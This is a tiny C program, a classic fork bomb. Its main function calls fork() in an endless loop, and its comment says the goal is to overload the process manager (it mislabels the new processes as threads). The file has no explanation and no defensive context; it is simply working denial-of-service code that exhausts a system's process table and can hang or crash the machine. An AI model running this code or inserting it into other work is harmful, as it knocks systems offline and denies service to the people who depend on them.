#include  <stdio.h>
#include  <sys/types.h>

int main(int argc, char const *argv[])
{
	// Making threads until the process manager is overloaded
	for (;;) {
		fork();
	}
	
	return 0;
}